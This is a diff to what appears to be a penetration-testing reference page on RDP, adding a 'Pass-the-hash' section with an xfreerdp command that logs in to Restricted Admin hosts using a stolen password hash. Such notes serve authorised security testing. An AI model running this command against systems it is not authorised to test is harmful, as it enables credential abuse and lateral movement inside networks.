@@ -46,6 +46,15 @@ rdesktop [options] server[:port]
 Remmina
 ```
 
+### Pass-the-hash
+
+FreeRDP can be used to authenticate using the hash through RDP against hosts
+using the Restricted Admin mode feature.
+
+```
+xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:<HASH> /v:<HOST | IP>
+```
+
 ### Known vulnerabilities
 
 Nmap and metasploit can be used to check for the following exploits:
